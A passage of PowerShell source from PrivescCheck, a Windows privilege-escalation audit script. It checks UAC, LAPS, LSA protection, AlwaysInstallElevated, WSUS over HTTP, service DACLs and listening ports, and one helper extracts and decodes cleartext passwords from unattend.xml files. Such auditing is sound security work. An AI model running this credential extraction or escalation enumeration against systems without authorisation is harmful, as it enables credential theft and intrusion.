        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Service
            )
            Add-Type -AssemblyName System.ServiceProcess # ServiceProcess is not loaded by default  
            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $ReadControl = 0x00020000
            $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))
            $RawHandle
        }
    }

    PROCESS {
        ForEach($ServiceName in $Name) {

            $IndividualService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue -ErrorVariable GetServiceError
            if (-not $GetServiceError) {

                try {
                    $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
                }
                catch {
                    $ServiceHandle = $Null
                }

                if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                    $SizeNeeded = 0

                    $Result = [PrivescCheck.Win32]::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded)
                    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    # 122 == The data area passed to a system call is too small
                    if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                        $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)

                        $Result = [PrivescCheck.Win32]::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded)
                        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result) {
                            
                            $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0

                            $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                                Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value $([PrivescCheck.Win32+ServiceAccessFlags] $_.AccessMask) -PassThru
                            }

                            Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
                        }
                    }

                    $Null = [PrivescCheck.Win32]::CloseServiceHandle($ServiceHandle)
                }
            }
        }
    }
}

function Get-UEFIStatus {
    <#
    .SYNOPSIS

    Helper - Gets the BIOS mode of the machine (Legacy / UEFI)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Invokes the "GetFirmwareEnvironmentVariable()" function from the Windows API with dummy 
    parameters. Indeed, the queried value doesn't matter, what matters is the last error code,
    which you can get by invoking "GetLastError()". If the return code is ERROR_INVALID_FUNCTION,
    this means that the function is not supported by the BIOS so it's LEGACY. Otherwise, the error
    code will indicate that it cannot find the requested variable, which means that the function is
    supported by the BIOS so it's UEFI. 
    
    .EXAMPLE

    PS C:\> Get-BiosMode

    Name Status Description      
    ---- ------ -----------
    UEFI   True BIOS mode is UEFI
    
    .NOTES

    https://github.com/xcat2/xcat-core/blob/master/xCAT-server/share/xcat/netboot/windows/detectefi.cpp
    https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getfirmwareenvironmentvariablea
    https://github.com/ChrisWarwick/GetUEFI/blob/master/GetFirmwareBIOSorUEFI.psm1

    #>

    [CmdletBinding()]Param()

    $OsVersion = [System.Environment]::OSVersion.Version

    # Windows >= 8/2012
    if (($OsVersion.Major -ge 10) -or (($OsVersion.Major -ge 6) -and ($OsVersion.Minor -ge 2))) {

        [int]$FirmwareType = 0
        $Result = [PrivescCheck.Win32]::GetFirmwareType([ref]$FirmwareType)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if ($Result -gt 0) {
            if ($FirmwareType -eq 1) {
                # FirmwareTypeBios = 1
                $Status = $False 
                $Description = "BIOS mode is Legacy"
            } elseif ($FirmwareType -eq 2) {
                # FirmwareTypeUefi = 2
                $Status = $True 
                $Description = "BIOS mode is UEFI"
            } else {
                $Description = "BIOS mode is unknown"
            }
        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }

    # Windows = 7/2008 R2
    } elseif (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -eq 1)) {

        [PrivescCheck.Win32]::GetFirmwareEnvironmentVariable("", "{00000000-0000-0000-0000-000000000000}", [IntPtr]::Zero, 0) | Out-Null 
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    
        $ERROR_INVALID_FUNCTION = 1
        if ($LastError -eq $ERROR_INVALID_FUNCTION) {
            $Status = $False 
            $Description = "BIOS mode is Legacy"
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        } else {
            $Status = $True 
            $Description = "BIOS mode is UEFI"
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }
        
    } else {
        $Description = "Cannot check BIOS mode"
    }

    $BiosMode = New-Object -TypeName PSObject
    $BiosMode | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "UEFI"
    $BiosMode | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
    $BiosMode | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
    $BiosMode
}

function Get-SecureBootStatus {
    <#
    .SYNOPSIS
    
    Helper - Get the status of Secure Boot (enabled/disabled/unsupported)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    In case of a UEFI BIOS, you can check whether 'Secure Boot' is enabled by looking at the 
    'UEFISecureBootEnabled' value of the following registry key: 'HKEY_LOCAL_MACHINE\SYSTEM\Current
    ControlSet\Control\SecureBoot\State'. 
    
    .EXAMPLE

    PS C:\> Get-SecureBootStatus

    Name        Status Description
    ----        ------ -----------
    Secure Boot   True Secure Boot is enabled

    #>
    
    [CmdletBinding()]Param()

    $RegPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecureBoot\State"
    $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 

    if (-not $GetItemPropertyError) {

        if (-not ($Null -eq $Result.UEFISecureBootEnabled)) {

            if ($Result.UEFISecureBootEnabled -eq 1) {
                $Status = $True
                $Description = "Secure Boot is enabled"
            } else {
                $Status = $False
                $Description = "Secure Boot is disabled"
            }
        } else {
            $Status = $False
            $Description = "Secure Boot is not supported"
        }
    } else {
        $Status = $False
        $Description = "Secure Boot is not supported"
    }

    $SecureBootStatus = New-Object -TypeName PSObject
    $SecureBootStatus | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "Secure Boot"
    $SecureBootStatus | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
    $SecureBootStatus | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
    $SecureBootStatus
}

function Get-CredentialGuardStatus {
    <#
    .SYNOPSIS

    Helper - Gets the status of Windows Defender Credential Guard 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Gets the status of the Credential Guard by reading the 'LsaCfgFlags' value of the following 
    registry key: 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA'. Possible values are:
    None=>Not configured, 0=>Disabled, 1=>Enabled with UEFI lock, 2=>Disabled without UEFI lock.
    
    .EXAMPLE

    PS C:\> Get-CredentialGuardStatus

    Name             Status Description
    ----             ------ -----------
    Credential Guard  False Credential Guard is not configured
    
    .LINK

    https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage

    #>
    
    [CmdletBinding()]Param()

    $OsVersion = [System.Environment]::OSVersion.Version

    if ($OsVersion.Major -ge 10) {

        $RegPath = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA"
        $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
    
        if (-not $GetItemPropertyError) {
    
            if (-not ($Null -eq $Result.LsaCfgFlags)) {
    
                if ($Result.LsaCfgFlags -eq 0) {
                    $Status = $False 
                    $Description = "Credential Guard is disabled"
                } elseif ($Result.LsaCfgFlags -eq 1) {
                    $Status = $True 
                    $Description = "Credential Guard is enabled with UEFI lock"
                } elseif ($Result.LsaCfgFlags -eq 2) {
                    $Status = $True
                    $Description = "Credential Guard is enabled without UEFI lock"
                } 
            } else {
                $Status = $False 
                $Description = "Credential Guard is not configured"
            }
        }
    } else {
        $Status = $False
        $Description = "Credential Guard is not supported on this OS"
    }

    $CredentialGuardStatus = New-Object -TypeName PSObject
    $CredentialGuardStatus | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "Credential Guard"
    $CredentialGuardStatus | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
    $CredentialGuardStatus | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
    $CredentialGuardStatus
}

function Get-LsaRunAsPPLStatus {
    <#
    .SYNOPSIS

    Helper - Gets the status of RunAsPPL option for LSA

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    RunAsPPL can be enabled for the LSA process in the registry. If it's enabled and the device has
    Secure Boot or UEFI, this setting is stored in the UEFI firmware so removing the registry key 
    won't disable this setting. 
    
    .EXAMPLE

    PS C:\> Get-LsaRunAsPPLStatus
    
    Name     Status Description        
    ----     ------ -----------
    RunAsPPL   True RunAsPPL is enabled
    
    .LINK

    https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection
    #>
    

    [CmdletBinding()]Param()

    $OsVersion = [System.Environment]::OSVersion.Version

    # if Windows >= 8.1 / 2012 R2
    if ($OsVersion.Major -eq 10 -or ( ($OsVersion.Major -eq 6) -and ($OsVersion.Minor -ge 3) )) {

        $RegPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"
        $Result = Get-ItemProperty -Path "REgistry::$($RegPath)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError

        if (-not $GetItemPropertyError) {

            if (-not ($Null -eq $Result.RunAsPPL)) {

                if ($Result.RunAsPPL -eq 1) {
                    $Status = $True 
                    $Description = "RunAsPPL is enabled"
                } else {
                    $Status = $False 
                    $Description = "RunAsPPL is disabled"
                } 
            } else {
                $Status = $False 
                $Description = "RunAsPPL is not configured"
            }
        }

    } else {
        # RunAsPPL not supported 
        $Status = $False 
        $Description = "RunAsPPL is not supported on this OS"
    }

    $LsaRunAsPplStatus = New-Object -TypeName PSObject
    $LsaRunAsPplStatus | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "RunAsPPL"
    $LsaRunAsPplStatus | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
    $LsaRunAsPplStatus | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
    $LsaRunAsPplStatus

}

function Get-UnattendSensitiveData {
    <#
    .SYNOPSIS

    Helper - Extract sensitive data from an "unattend" XML file

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Unattend files are XML documents which may contain cleartext passwords if they are not
    properly sanitized. Most of the time, "Password" fields will be replaced by the generic
    "*SENSITIVE*DATA*DELETED*" mention but sometimes, the original value remains and is either
    present in its plaintext form or base64-encoded form. If a non-empty password field is found
    and if it's not equal to the default "*SENSITIVE*DATA*DELETED*", this function will return the
    corresponding set of credentials: domain, username and (decoded) password. 
    
    .PARAMETER Path

    The Path of the "unattend.xml" file to parse
    
    .EXAMPLE

    PS C:\> Get-UnattendSensitiveData -Path C:\Windows\Panther\Unattend.xml

    Type         Domain      Username      Password
    ----         ------      --------      --------
    Credentials  contoso.com Administrator Password1
    LocalAccount N/A         John          Password1
    AutoLogon    .           Administrator P@ssw0rd
    
    .NOTES 

    A password can be stored in three formats:

    1) Simple string

        <Password>Password</Password>

    2) XML node + plain value
    
        <Password>
            <Value>Password</Value>
            <PlainText>true</PlainText>
        </Password>

    3) XML node + base64-encoded value

        <Password>
            <Value>UABhAHMAcwB3AG8AcgBkAA==</Value>
            <PlainText>false</PlainText>
        </Password> 

    /!\ UNICODE encoding!

    #>

    [CmdletBinding()]Param(
        [Parameter(Mandatory=$True)]
        [string]$Path
    )

    function Get-DecodedPassword {

        [CmdletBinding()]Param(
            [object]$XmlNode
        )

        if ($XmlNode.GetType().Name -eq "string") {
            $XmlNode
        } else {
            if ($XmlNode) {
                if ($XmlNode.PlainText -eq "false") {
                    [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($XmlNode.Value))
                } else {
                    $XmlNode.Value
                }
            }
        }
    }

    [xml] $Xml = Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError

    if (-not $GetContentError) {

        $Xml.GetElementsByTagName("Credentials") | ForEach-Object {

            $Password = Get-DecodedPassword -XmlNode $_.Password

            if ($Password -and ( -not ($Password -eq "*SENSITIVE*DATA*DELETED*"))) {
                $Item = New-Object -TypeName PSObject
                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Credentials"
                $Item | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
                $Item | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
                $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Password
                $Item
            }
        }
    
        $Xml.GetElementsByTagName("LocalAccount") | ForEach-Object {

            $Password = Get-DecodedPassword -XmlNode $_.Password
    
            if ($Password -and ( -not ($Password -eq "*SENSITIVE*DATA*DELETED*"))) {
                $Item = New-Object -TypeName PSObject
                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "LocalAccount"
                $Item | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
                $Item | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Name
                $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Password
                $Item
            }
        }
    
        $Xml.GetElementsByTagName("AutoLogon") | ForEach-Object {

            $Password = Get-DecodedPassword -XmlNode $_.Password

            if ($Password -and ( -not ($Password -eq "*SENSITIVE*DATA*DELETED*"))) {
                $Item = New-Object -TypeName PSObject
                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AutoLogon"
                $Item | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
                $Item | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
                $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Password
                $Item
            }
        }

        $Xml.GetElementsByTagName("AdministratorPassword") | ForEach-Object {

            $Password = Get-DecodedPassword -XmlNode $_

            if ($Password -and ( -not ($Password -eq "*SENSITIVE*DATA*DELETED*"))) {
                $Item = New-Object -TypeName PSObject
                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AdministratorPassword"
                $Item | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
                $Item | Add-Member -MemberType "NoteProperty" -Name "Username" -Value "N/A"
                $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Password
                $Item
            }
        }
    }
}
#endregion Helpers 


# ----------------------------------------------------------------
# Checks  
# ----------------------------------------------------------------
#region Checks 

# ----------------------------------------------------------------
# BEGIN REGISTRY SETTINGS   
# ----------------------------------------------------------------
function Invoke-UacCheck {
    <#
    .SYNOPSIS

    Checks whether UAC (User Access Control) is enabled

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The state of UAC can be determined based on the value of the parameter "EnableLUA" in the
    following registry key:
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    0 = Disabled
    1 = Enabled 
    
    .EXAMPLE

    PS C:\> Invoke-UacCheck | fl

    Path      : Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA : 1
    Enabled   : True
    
    .NOTES

    "UAC was formerly known as Limited User Account (LUA)."

    .LINK

    https://docs.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-lua-settings-enablelua
    #>
    
    [CmdletBinding()]Param()

    $RegPath = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"

    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
    if (-not $GetItemPropertyError) {
        $UacResult = New-Object -TypeName PSObject
        $UacResult | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $RegPath
        $UacResult | Add-Member -MemberType "NoteProperty" -Name "EnableLUA" -Value $Item.EnableLUA
        $UacResult | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $($Item.EnableLUA -eq 1)
        $UacResult
    } else {
        Write-Verbose -Message "Error while querying '$RegPath'"
    }
}

function Invoke-LapsCheck {
    <#
    .SYNOPSIS

    Checks whether LAPS (Local Admin Password Solution) is enabled

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The status of LAPS can be check using the following registry key.
    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft Services\AdmPwd

    #>
    
    [CmdletBinding()]Param()
    
    $RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft Services\AdmPwd"

    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
    if (-not $GetItemPropertyError) {
        $LapsResult = New-Object -TypeName PSObject 
        $LapsResult | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $RegPath
        $LapsResult | Add-Member -MemberType "NoteProperty" -Name "AdmPwdEnabled" -Value $Item.AdmPwdEnabled
        $LapsResult | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $($Item.AdmPwdEnabled -eq 1)
        $LapsResult
    }
}

function Invoke-PowershellTranscriptionCheck {
    <#
    .SYNOPSIS

    Checks whether PowerShell Transcription is configured/enabled

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Powershell Transcription is used to log PowerShell scripts execution. It can be configured 
    thanks to the Group Policy Editor. The settings are stored in the following registry key:
    HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
    
    .EXAMPLE

    PS C:\> Invoke-PowershellTranscriptionCheck | fl

    EnableTranscripting    : 1
    EnableInvocationHeader : 1
    OutputDirectory        : C:\Transcripts
    
    .NOTES

    If PowerShell Transcription is configured, the settings can be found here:

    C:\>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription

    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
        EnableTranscripting    REG_DWORD    0x1
        OutputDirectory    REG_SZ    C:\Transcripts
        EnableInvocationHeader    REG_DWORD    0x1
    
    To enable PowerShell Transcription:
    Group Policy Editor > Administrative Templates > Windows Components > Windows PowerShell > PowerShell Transcription
    Set an output directory and set the policy as Enabled

    #>
    
    [CmdletBinding()]Param()

    $RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"

    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
    if (-not $GetItemPropertyError) {
        # PowerShell Transcription is configured 
        $PowershellTranscriptionResult = New-Object -TypeName PSObject 
        $PowershellTranscriptionResult | Add-Member -MemberType "NoteProperty" -Name "EnableTranscripting" -Value $Item.EnableTranscripting
        $PowershellTranscriptionResult | Add-Member -MemberType "NoteProperty" -Name "EnableInvocationHeader" -Value $Item.EnableInvocationHeader
        $PowershellTranscriptionResult | Add-Member -MemberType "NoteProperty" -Name "OutputDirectory" -Value $Item.OutputDirectory
        $PowershellTranscriptionResult
    } 
}

function Invoke-RegistryAlwaysInstallElevatedCheck {
    <#
    .SYNOPSIS

    Checks whether the AlwaysInstallElevated key is set in the registry.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    AlwaysInstallElevated can be configured in both HKLM and HKCU. "If the AlwaysInstallElevated 
    value is not set to "1" under both of the preceding registry keys, the installer uses elevated
    privileges to install managed applications and uses the current user's privilege level for 
    unmanaged applications."
    
    #>
    
    [CmdletBinding()]Param()

    $Result = New-Object -TypeName System.Collections.ArrayList

    $RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer"

    if (Test-Path -Path "Registry::$RegPath" -ErrorAction SilentlyContinue) {

        $HKLMval = Get-ItemProperty -Path "Registry::$RegPath" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
            $Item = New-Object -TypeName PSObject 
            $Item | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
            $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
            $Item | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
            [void]$Result.Add($Item)
        }

        $RegPath = "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer"

        if (Test-Path -Path "Registry::$RegPath" -ErrorAction SilentlyContinue) {

            $HKCUval = (Get-ItemProperty -Path "Registry::$RegPath" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                $Item = New-Object -TypeName PSObject
                $Item | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
                $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
                $Item | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
                [void]$Result.Add($Item)

                $Result
            }
        } 
    }
}

function Invoke-LsaProtectionsCheck {
    <#
    .SYNOPSIS

    Checks whether LSASS is configured to run as a Protected Process 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    First it reads the registry to check whether "RunAsPPL" is configured and enabled in the
    "LSA" key. It also checks whether additional protections such as Secure Boot or Credential
    Guard are configured / enabled. 
    
    .EXAMPLE

    On Windows 10:

    PS C:\> Invoke-LsaProtectionsCheck

    Name             Status Description
    ----             ------ -----------
    RunAsPPL           True RunAsPPL is enabled
    UEFI               True BIOS mode is UEFI
    Secure Boot        True Secure Boot is enabled
    Credential Guard  False Credential Guard is not configured
    
    .EXAMPLE

    On Windows Server 2012 R2:

    PS C:\> Invoke-LsaProtectionsCheck

    Name             Status Description
    ----             ------ -----------
    RunAsPPL          False RunAsPPL is not configured
    UEFI              False BIOS mode is Legacy
    Secure Boot       False Secure Boot is not supported
    Credential Guard  False Credential Guard is not supported on this OS

    #>
    
    [CmdletBinding()]Param()

    Get-LsaRunAsPPLStatus
    Get-UEFIStatus
    Get-SecureBootStatus
    Get-CredentialGuardStatus

}

function Invoke-WsusConfigCheck {
    <#
    .SYNOPSIS
    
    Checks whether the WSUS is enabled and vulnerable (Wsuxploit)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION
    
    A system can be compromise if the updates are not requested using HTTPS but HTTP. If the URL of
    the update server (WUServer) starts with HTTP and UseWUServer=1, then the update requests are
    vulnerable to MITM attacks.
    
    .EXAMPLE
    
    PS C:\> Invoke-WsusConfigCheck

    WUServer     : http://acme-upd01.corp.internal.com:8535
    UseWUServer  : 1
    IsVulnerable : True
    
    .LINK

    https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    https://github.com/pimps/wsuxploit
    #>

    $WindowsUpdateRegPath = "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate"
    $WindowsUpdateAURegPath = "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU"

    $WsusKeyServerValue = Get-ItemProperty -Path "Registry::$($WindowsUpdateRegPath)" -Name WUServer -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItemProperty
    if (-not $ErrorGetItemProperty) {

        $WusUrl = $WsusKeyServerValue.WUServer

        $UseWUServerValue = Get-ItemProperty -Path "Registry::$($WindowsUpdateAURegPath)" -Name UseWUServer -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItemProperty
        if (-not $ErrorGetItemProperty) {

            $WusEnabled = $UseWUServerValue.UseWUServer
            
            if ($WusUrl -Like "http://*" -and $WusEnabled -eq 1) {
                $IsVulnerable = $True
            } else {
                $IsVulnerable = $False
            }

            $Result = New-Object -TypeName PSObject
            $Result | Add-Member -MemberType "NoteProperty" -Name "WUServer" -Value $WusUrl
            $Result | Add-Member -MemberType "NoteProperty" -Name "UseWUServer" -Value $WusEnabled
            $Result | Add-Member -MemberType "NoteProperty" -Name "IsVulnerable" -Value $IsVulnerable
            $Result
        }
    }
}
# ----------------------------------------------------------------
# END REGISTRY SETTINGS   
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN NETWORK 
# ----------------------------------------------------------------
function Get-RpcRange {
    <#
    .SYNOPSIS

    Helper - Dynamically identifies the range of randomized RPC ports from a list of ports.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This function is a helper for the Invoke-TcpEndpointsCheck function. Windows uses a set of 
    RPC ports that are radomly allocated in the range 49152-65535 by default. If we want to 
    filter out these listening ports we must first figure out this set of ports. The aim of this 
    function is to guess this range using basic statistics on a given array of port numbers. We 
    can quite reliably identify the RPC port set because they are concentrated in a very small 
    range. It's not 100% reliable but it will do the job most of the time.
    
    .PARAMETER Ports

    An array of port numbers
    
    .EXAMPLE

    PS C:\> Get-RpcRange -Ports $Ports 

    MinPort MaxPort
    ------- -------
    49664   49672
    
    #>

    [CmdletBinding()]Param(
        [Parameter(Mandatory=$True)]
        [int[]]
        $Ports
    )

    function Get-Stats {
        [CmdletBinding()]Param(
            [int[]]$Ports,
            [int]$MinPort,
            [int]$MaxPort,
            [int]$Span
        )

        $Stats = @() 
        For ($i = $MinPort; $i -lt $MaxPort; $i += $Span) {
            $Counter = 0
            ForEach ($Port in $Ports) {
                if (($Port -ge $i) -and ($Port -lt ($i + $Span))) {
                    $Counter += 1
                }
            }
            $RangeStats = New-Object -TypeName PSObject 
            $RangeStats | Add-Member -MemberType "NoteProperty" -Name "MinPort" -Value $i
            $RangeStats | Add-Member -MemberType "NoteProperty" -Name "MaxPort" -Value ($i + $Span)
            $RangeStats | Add-Member -MemberType "NoteProperty" -Name "PortsInRange" -Value $Counter
            $Stats += $RangeStats 
        }
        $Stats
    }

    # We split the range 49152-65536 into blocks of size 32 and then, we take the block which has 
    # greater number of ports in it. 
    $Stats = Get-Stats -Ports $Ports -MinPort 49152 -MaxPort 65536 -Span 32

    $MaxStat = $Null
    ForEach ($Stat in $Stats) {
        if ($Stat.PortsInRange -gt $MaxStat.PortsInRange) {
            $MaxStat = $Stat
        }
    } 

    For ($i = 0; $i -lt 8; $i++) {
        $Span = ($MaxStat.MaxPort - $MaxStat.MinPort) / 2
        $NewStats = Get-Stats -Ports $Ports -MinPort $MaxStat.MinPort -MaxPort $MaxStat.MaxPort -Span $Span
        if ($NewStats) {
            if ($NewStats[0].PortsInRange -eq 0) {
                $MaxStat = $NewStats[1]
            } elseif ($NewStats[1].PortsInRange -eq 0) {
                $MaxStat = $NewStats[0]
            } else {
                break 
            }
        }
    }

    $RpcRange = New-Object -TypeName PSObject 
    $RpcRange | Add-Member -MemberType "NoteProperty" -Name "MinPort" -Value $MaxStat.MinPort
    $RpcRange | Add-Member -MemberType "NoteProperty" -Name "MaxPort" -Value $MaxStat.MaxPort
    $RpcRange
}

function Invoke-TcpEndpointsCheck {
    <#
    .SYNOPSIS

    Enumerates all TCP endpoints on the local machine (IPv4 and IPv6)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    It uses the custom "Get-NetworkEndpoints" function to enumerate all the TCP endpoints on the
    local machine, IPv4 and IPv6. The list can then be filtered based on a list of known ports.
    
    .PARAMETER Filtered

    Use this switch to filter out the list of endpoints returned by this function. The filter 
    excludes all the standard ports such as 445 or 139 and all the random RPC ports. The RPC port
    range is dynamically guessed using the helper function "Get-RpcRange".
    
    .EXAMPLE

    PS C:\> Invoke-TcpEndpointsCheck | ft

    IP   Proto LocalAddress       State      PID Name
    --   ----- ------------       -----      --- ----
    IPv4 TCP   0.0.0.0:135        LISTENING  968 svchost
    IPv4 TCP   0.0.0.0:445        LISTENING    4 System
    IPv4 TCP   0.0.0.0:5040       LISTENING 5408 svchost
    IPv4 TCP   0.0.0.0:49664      LISTENING  732 lsass
    IPv4 TCP   0.0.0.0:49665      LISTENING  564 wininit
    IPv4 TCP   0.0.0.0:49666      LISTENING 1208 svchost
    IPv4 TCP   0.0.0.0:49667      LISTENING 1412 svchost
    IPv4 TCP   0.0.0.0:49668      LISTENING 2416 spoolsv
    IPv4 TCP   0.0.0.0:49669      LISTENING  656 services
    IPv4 TCP   192.168.74.136:139 LISTENING    4 System
    IPv6 TCP   [::]:135           LISTENING  968 svchost
    IPv6 TCP   [::]:445           LISTENING    4 System
    IPv6 TCP   [::]:49664         LISTENING  732 lsass
    IPv6 TCP   [::]:49665         LISTENING  564 wininit
    IPv6 TCP   [::]:49666         LISTENING 1208 svchost
    IPv6 TCP   [::]:49667         LISTENING 1412 svchost
    IPv6 TCP   [::]:49668         LISTENING 2416 spoolsv
    IPv6 TCP   [::]:49669         LISTENING  656 services
    
    #>

    [CmdletBinding()]Param(
        [switch]$Filtered
    )

    $IgnoredPorts = @(135, 139, 445)

    $Endpoints = Get-NetworkEndpoints
    $Endpoints += Get-NetworkEndpoints -IPv6

    if ($Filtered) {
        $FilteredEndpoints = @()
        $AllPorts = @()
        $Endpoints | ForEach-Object { $AllPorts += $_.LocalPort }
        $AllPorts = $AllPorts | Sort-Object -Unique
        
        $RpcRange = Get-RpcRange -Ports $AllPorts
